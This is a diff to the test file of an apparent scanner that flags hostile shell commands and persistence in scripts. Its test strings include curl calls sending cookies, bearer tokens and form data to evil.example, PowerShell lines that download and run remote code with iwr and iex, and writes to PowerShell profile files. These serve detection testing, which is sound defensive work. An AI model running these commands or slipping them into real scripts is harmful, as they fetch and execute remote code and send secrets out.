@@ -187,7 +187,7 @@ test('shell commands fetching or handing off code, in a script\'s strings', () =
     'spawn("curl", ["-o", outputs[i], options?.flag, "https://evil.example/x"])',
   ].join('\n')), { shell: [1, 2, 3, 4, 5, 6] }, 'a program run with its arguments apart, a variable\'s or a property\'s value between')
   assert.deepEqual(found('a.js', `spawn("curl", ["-H", "Authorization: Bearer ${'x'.repeat(600)}", "https://evil.example/p"])\n`), { shell: [1] }, 'a long argument before the URL')
-  assert.deepEqual(found('a.js', 'exec(\'curl -d "a=1&b=2" https://evil.example/p\')\nspawn("curl", ["-H", "Cookie: a=b; c=d", "https://evil.example/p"])\n'), { shell: [1, 2] },
+  assert.deepEqual(found('a.js', 'exec(\'curl -d "a=1&b=2" https://evil.example/p\')\nspawn("curl", ["-H", "Cookie: a=b; c=d", "https://evil.example/p"])\nspawn("curl", ["-H", \'Cookie: a="b"; c=d\', "https://evil.example/p"])\n'), { shell: [1, 2, 3] },
     'a quoted argument\'s separators, or an argument\'s apart, no command\'s end')
   assert.equal(found('setup.sh', 'echo foo \\| sh\ngrep -q \'bash\\|zsh\' /etc/shells\n'), null, 'an escaped pipe, grep\'s alternatives')
   assert.deepEqual(found('setup.sh', 'curl -s -d \'x=1;y=2\' "https://evil.example/p"\necho "it\'s" && curl -H "X: a|b" https://evil.example/q\ncurl --version; echo "https://example.com"\n'), { shell: [1, 2] },
@@ -280,6 +280,7 @@ test('a shell script is read whole for its shell commands and the places it name
   ].join('\n')), { shell: [1, 2, 3], persistence: [4, 5] }, 'PowerShell running what it fetches, and its profile')
   assert.deepEqual(found('setup.ps1', 'Invoke-Expression \u0060\n  (Invoke-WebRequest https://evil.example/p).Content\nirm https://get.example \u0060\n  | iex\niex $x\niwr https://x.example/f -OutFile f\niex $x && iwr https://x.example/f -OutFile f\niex (irm https://evil.example/p | Out-String)\n'), { shell: [1, 3, 8] },
     'its line continued by a backtick, not the next line')
+  assert.equal(found('setup.ps1', 'iex $local \\\niwr https://example.com/p -OutFile p\niwr https://example.com/p ^\n| iex\n'), null, 'not by sh\'s backslash nor cmd\'s caret')
   assert.deepEqual(found('setup.ps1', `iwr https://evil.example/p -Headers @{Authorization="Bearer ${'x'.repeat(1500)}"} | iex\nGet-Content p.ps1 | powershell\ntype p.ps1 | powershell.exe\n`), { shell: [1, 2, 3] },
     'long options before the pipe, and a pipe to Windows PowerShell')
   assert.deepEqual(found('setup.ps1', 'Set-Content "$HOME\\Documents\\PowerShell\\Profile.ps1" $p\nAdd-Content $PSHOME\\Profile.ps1 $p\n& ./scripts/profile.ps1\n'), { persistence: [1, 2] },
